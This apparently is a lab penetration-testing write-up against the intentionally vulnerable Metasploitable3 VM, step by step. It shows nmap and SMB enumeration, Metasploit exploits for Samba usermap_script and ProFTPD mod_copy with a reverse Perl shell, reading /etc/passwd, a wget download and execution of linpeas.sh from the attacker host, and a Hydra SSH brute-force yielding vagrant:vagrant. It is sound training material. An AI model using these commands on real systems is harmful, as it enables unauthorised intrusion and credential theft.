# Penetration Testing Project Report (Metasploitable3)

<h3>
  
  
  Phase 1: Setup and Target Discovery
</h3>

<ul>
<li><strong>Step Description:</strong></li>
<li>Managing and running virtual machines via VirtualBox, specifically starting the <code>Metasploitable3-ub1404</code> system and the <code>kali</code> attacking machine.</li>
<li>Verifying the IP addresses of the target machine (such as <code>10.0.2.15</code>) via the command line interface to ensure connection readiness and begin the penetration testing lifecycle.</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbtmnrngmgbist3m07q6h.png"><img alt=" " height="414" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbtmnrngmgbist3m07q6h.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fs91l39b6w36xs320oc3p.png"><img alt=" " height="426" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fs91l39b6w36xs320oc3p.png" width="800" /></a></p>




<h3>
  
  
  Phase 2: Initial Port Scanning
</h3>

<ul>
<li><strong>Step Description:</strong></li>
<li>Performing a comprehensive scan of ports and services running on the target machine using the <code>nmap</code> tool along with version detection scripts (<code>-sV -sC</code>).</li>
<li><p>The scan results showed several open ports including FTP (port 21), SSH (port 22), HTTP (port 80), and SMB (port 445).</p></li>
<li><p><strong>Command Used:</strong><br />
</p></li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> 10.0.2.15

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F9gln4cr0cj6r2af1o3d5.png"><img alt=" " height="565" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F9gln4cr0cj6r2af1o3d5.png" width="800" /></a></p>




<h3>
  
  
  Phase 3: Enumeration
</h3>

<ul>
<li><strong>Step Description:</strong></li>
<li>Targeting discovered services to inspect file sharing and identify the version and data related to the network and shared directories using enumeration tools (such as <code>enum4linux</code>).</li>
<li><p>Running the enumeration tool against the target address to gather as much system information and available shares as possible.</p></li>
<li><p><strong>Command Used:</strong><br />
</p></li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>enum4linux <span class="nt">-a</span> 10.0.2.15

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F5j6ho264lgg0f3yq49po.png"><img alt=" " height="64" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F5j6ho264lgg0f3yq49po.png" width="800" /></a></p>




<h3>
  
  
  Phase 4: Web Enumeration and Service Browsing
</h3>

<ul>
<li><strong>Step Description:</strong></li>
<li>Moving to examine and browse web services running via the browser.</li>
<li>Browsing the web server's root directory (<code>Index of /</code>), which revealed several sensitive folders and applications such as <code>chat/</code>, <code>drupal/</code>, <code>payroll_app.php</code>, and <code>phpmyadmin/</code>.</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fserrdgxsbv0k413owx5t.png"><img alt=" " height="369" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fserrdgxsbv0k413owx5t.png" width="800" /></a></p>

<p>...............................................................</p>

<h2>
  
  
  Port 445 (SMB / Samba) - Penetration Testing &amp; Exploitation Report
</h2>




<h3>
  
  
  1. Initial Samba Host Script Enumeration
</h3>

<ul>
<li>
<strong>Step Description:</strong> Executed Nmap host scripts targeting port 445 to retrieve SMB details, revealing the operating system version (<code>Windows 6.1 (Samba 4.3.11-Ubuntu)</code>), computer name, NetBIOS settings, and security mode configurations.</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fyif20vl45bhmt9og7ufg.png"><img alt=" " height="199" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fyif20vl45bhmt9og7ufg.png" width="800" /></a></p>




<h3>
  
  
  2. Vulnerability Search via Searchsploit
</h3>

<ul>
<li>
<strong>Step Description:</strong> Used <code>searchsploit</code> to look for known exploits matching the discovered Samba version (<code>Samba 4.3.11</code>), identifying potential exploit paths such as the arbitrary module load vulnerability.</li>
<li>
<strong>Command Used:</strong>
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>searchsploit samba 4.3.11

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxaicg3uexutganlc3365.png"><img alt=" " height="60" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxaicg3uexutganlc3365.png" width="799" /></a></p>




<h3>
  
  
  3. Enumerating SMB Shares via Smbclient
</h3>

<ul>
<li>
<strong>Step Description:</strong> Ran <code>smbclient</code> with null/guest authentication (<code>-N</code>) to list available shared resources on the target, exposing shares like <code>print$</code>, <code>public</code>, and <code>IPC$</code>.</li>
<li>
<strong>Command Used:</strong>
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>smbclient <span class="nt">-L</span> 10.0.2.15 <span class="nt">-N</span>

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fkmau2arfuteo5vapxy6v.png"><img alt=" " height="143" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fkmau2arfuteo5vapxy6v.png" width="800" /></a></p>




<h3>
  
  
  4. Searching for Samba Exploits in Metasploit
</h3>

<ul>
<li>
<strong>Step Description:</strong> Initialized the Metasploit Framework (<code>msfconsole</code>) and searched for available modules related to <code>samba</code> to find applicable exploit vectors.</li>
<li>
<strong>Command Used:</strong>
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight plaintext"><code>msf6 &gt; search samba

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Flu465nkk1fkldw5c7mu9.png"><img alt=" " height="552" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Flu465nkk1fkldw5c7mu9.png" width="675" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fp8idn8y3itisb9pazx57.png"><img alt=" " height="345" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fp8idn8y3itisb9pazx57.png" width="799" /></a></p>




<h3>
  
  
  5. Configuring and Running the Samba Exploit Module
</h3>

<ul>
<li>
<strong>Step Description:</strong> Selected the <code>multi/samba/usermap_script</code> exploit module (<code>use 15</code>), inspected its options via <code>show options</code>, configured the target host (<code>rhosts 10.0.2.15</code>) and target port (<code>rport 445</code>), and executed the module to attempt session creation.</li>
<li>
<strong>Commands Used:</strong>
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight plaintext"><code>msf6 &gt; use 15
msf6 exploit(multi/samba/usermap_script) &gt; show options
msf6 exploit(multi/samba/usermap_script) &gt; set rhosts 10.0.2.15
msf6 exploit(multi/samba/usermap_script) &gt; set rport 445
msf6 exploit(multi/samba/usermap_script) &gt; run

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fv2437f4oiaxvvom7uxd2.png"><img alt=" " height="388" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fv2437f4oiaxvvom7uxd2.png" width="800" /></a><br />
...............................................................</p>
<h1>
  
  
  Penetration Testing &amp; Exploitation Report: FTP Service (Port 21) on Metasploitable3
</h1>


<h2>
  
  
  1. Port Scan &amp; Vulnerability Enumeration
</h2>

<ul>
<li>
<strong>Nmap Port Scan:</strong> Executed a vulnerability scan script (<code>--script vuln</code>) targeting port 21 on the target <code>10.0.2.15</code> to check the service state.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>nmap <span class="nt">--script</span> vuln <span class="nt">-p</span> 21 10.0.2.15

</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fe3gi37uzk0b6xk31p4nf.png"><img alt=" " height="234" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fe3gi37uzk0b6xk31p4nf.png" width="685" /></a></p>

<ul>
<li>
<strong>Interactive FTP Connection Attempt:</strong> Connected to the FTP service interactively to verify the version (<code>ProFTPD 1.3.5</code>) and test anonymous login, which resulted in a login failure.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>ftp 10.0.2.15
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fwb7tugc9bjryiqb1vpbu.png"><img alt=" " height="227" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fwb7tugc9bjryiqb1vpbu.png" width="768" /></a></p>


<h2>
  
  
  2. Exploit Search &amp; Metasploit Configuration
</h2>

<ul>
<li>
<strong>Searching for Exploits via Searchsploit:</strong> Used <code>searchsploit</code> to look for known vulnerabilities matching <code>ProFTPD 1.3.5</code>, identifying <code>mod_copy</code> command execution vectors.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>searchsploit proftpd 1.3.5
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fj0ykrglolvxwbdq06k8k.png"><img alt=" " height="76" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fj0ykrglolvxwbdq06k8k.png" width="799" /></a></p>

<ul>
<li>
<strong>Searching Modules in Metasploit:</strong> Initialized Metasploit (<code>msfconsole</code>) to search for the ProFTPD <code>mod_copy</code> exploit module.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>msfconsole <span class="nt">--</span><span class="o">&gt;</span> search proftpd 1.3.5
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fd9pn57blekossecmsvr5.png"><img alt=" " height="456" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fd9pn57blekossecmsvr5.png" width="800" /></a></p>

<ul>
<li>
<strong>Configuring Target Host (<code>RHOSTS</code>):</strong> Selected the exploit module and set the remote target IP address to <code>10.0.2.15</code>.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>use exploit/unix/ftp/proftpd_modcopy_exec 
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">set </span>rhosts 10.0.2.15
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fepxkcy8e4g2g9bun6dij.png"><img alt=" " height="37" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fepxkcy8e4g2g9bun6dij.png" width="573" /></a></p>

<ul>
<li>
<strong>Configuring Site Path (<code>SITEPATH</code>):</strong> Set the absolute writable website path option for the payload delivery.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">set </span>SITEPATH /var/www/html
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fhjjyldyzwhbv8gm13xn4.png"><img alt=" " height="31" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fhjjyldyzwhbv8gm13xn4.png" width="608" /></a></p>

<ul>
<li>
<strong>Configuring the Reverse Payload:</strong> Selected and configured the reverse shell payload (<code>cmd/unix/reverse_perl</code>) for the exploit.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">set </span>PAYLOAD payload/cmd/unix/reverse_perl
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fnhztj9l378x3ifsu81nm.png"><img alt=" " height="33" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fnhztj9l378x3ifsu81nm.png" width="797" /></a></p>


<h2>
  
  
  3. Exploit Execution &amp; Initial Access
</h2>

<ul>
<li>
<strong>Executing the Exploit Module:</strong> Ran the configured exploit, which successfully handled the reverse TCP connection, executed the PHP payload, and opened an interactive command shell session as <code>www-data</code>.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>run
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fq9xbooyzudamzzq1bi40.png"><img alt=" " height="175" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fq9xbooyzudamzzq1bi40.png" width="800" /></a></p>

<ul>
<li>
<strong>Inspecting System Password File:</strong> Read <code>/etc/passwd</code> within the shell session to inspect existing user accounts and home directories.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">cat</span> /etc/passwd
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2z2u35xxil59bi8ud3qi.png"><img alt=" " height="645" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2z2u35xxil59bi8ud3qi.png" width="800" /></a></p>

<ul>
<li>
<strong>Filtering System User Accounts:</strong> Filtered the password file entries by home directories to list active system user usernames.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>home | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">":"</span> <span class="nt">-f</span> 1
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fq80fop0s3hvvs4o9t4v3.png"><img alt=" " height="285" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fq80fop0s3hvvs4o9t4v3.png" width="720" /></a></p>


<h2>
  
  
  4. Post-Exploitation Enumeration &amp; LinPEAS Setup
</h2>

<ul>
<li>
<strong>Locating and Preparing LinPEAS:</strong> Navigated to the PEASS suite directory on the attacker machine and prepared the local Python HTTP server.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">cd</span> /usr/share/peass/linpeas
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>python3 <span class="nt">-m</span> http.server 9000
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2yj4sjpsw63oxh1pfwd7.png"><img alt=" " height="371" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2yj4sjpsw63oxh1pfwd7.png" width="800" /></a></p>

<ul>
<li>
<strong>Downloading and Running LinPEAS on the Target:</strong> Downloaded <code>linpeas.sh</code> onto the target system's <code>/tmp</code> directory via <code>wget</code>, applied executable permissions, and ran the script.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">cd</span> /tmp
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>wget 10.0.2.4:9000/linpeas.sh
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">chmod</span> +x linpeas.sh
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>./linpeas.sh
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fyw0drjbf407afnk1dn8s.png"><img alt=" " height="419" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fyw0drjbf407afnk1dn8s.png" width="656" /></a></p>


<h2>
  
  
  5. Web Services &amp; Application Reconnaissance
</h2>

<ul>
<li>
<strong>Browsing Root Web Directory:</strong> Accessed the target's web server index via browser (<code>10.0.2.15</code>) to uncover hosted directories like <code>chat</code>, <code>drupal</code>, <code>phpmyadmin</code>, and <code>payroll_app.php</code>.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>URL : http://10.0.2.15/
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fuh6q19y3let6lgkj9c9l.png"><img alt=" " height="362" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fuh6q19y3let6lgkj9c9l.png" width="581" /></a></p>

<ul>
<li>
<strong>Opening the Drupal Application:</strong> Navigated to the deployed Drupal web application instance to check configuration warnings and login panels.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>URL : http://10.0.2.15/drupal
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fmgvj81mdw433vybxhaxn.png"><img alt=" " height="351" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fmgvj81mdw433vybxhaxn.png" width="799" /></a></p>

<ul>
<li>
<strong>Analyzing Drupal Configuration Files:</strong> Inspected the database connection parameters and security salts found within the Drupal application configuration files.</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Funcm94qyxm0rwweu6z4g.png"><img alt=" " height="648" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Funcm94qyxm0rwweu6z4g.png" width="800" /></a><br />
...............................................................</p>
<h1>
  
  
  Penetration Testing &amp; Exploitation Report: SSH Service (Port 22) on Metasploitable3
</h1>


<h2>
  
  
  1. Custom Wordlist Generation via CeWL
</h2>

<ul>
<li>
<strong>Generating a Custom Password Wordlist from Project Wiki:</strong> Used the <code>cewl</code> tool to scrape and generate a custom wordlist from the Metasploitable3 GitHub wiki page, setting a minimum word length of 7 and outputting it to <code>cew.txt</code>.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>cewl https://github.com/rapid7/metasploitable3/wiki <span class="nt">-m</span> 7 <span class="nt">-d</span> 0 <span class="nt">-w</span> /home/kali/cew.txt<span class="sb">`</span>
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F8uwwku14kykl1faqaate.png"><img alt=" " height="74" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F8uwwku14kykl1faqaate.png" width="800" /></a></p>


<h2>
  
  
  2. User Enumeration Preparation
</h2>

<ul>
<li>
<strong>Creating the Usernames List (<code>user.txt</code>):</strong> Prepared a target user list containing potential usernames (such as system accounts and Star Wars themed accounts like <code>vagrant</code>, <code>leia_organa</code>, <code>luke_skywalker</code>, etc.) for brute-force enumeration.</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fsoh53xz8tykbdvogb12f.png"><img alt=" " height="314" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fsoh53xz8tykbdvogb12f.png" width="375" /></a></p>


<h2>
  
  
  3. Credential Brute-Forcing via Hydra
</h2>

<ul>
<li>
<strong>Running Hydra against SSH Service:</strong> Executed a password-guessing attack against the SSH service on port 22 using the generated username list (<code>user.txt</code>) and the custom password wordlist (<code>cew.txt</code>), successfully cracking the credentials (<code>vagrant:vagrant</code>).
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>hydra <span class="nt">-L</span> user.txt <span class="nt">-P</span> cew.txt 10.0.2.15 ssh <span class="nt">-t</span> 10
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0bbrxxvhu9m8loecjob3.png"><img alt=" " height="81" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0bbrxxvhu9m8loecjob3.png" width="798" /></a></p>


<h2>
  
  
  4. SSH Access and Interactive Shell
</h2>

<ul>
<li>
<strong>Establishing an SSH Connection:</strong> Logged into the target system via SSH using the cracked credentials (<code>vagrant@10.0.2.15</code>), successfully obtaining an interactive terminal session on the Ubuntu 14.04.6 LTS machine.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>ssh vagrant@10.0.2.15
</code></pre>

</div>


<p>username : vagrant<br />
password : vagrant<br />
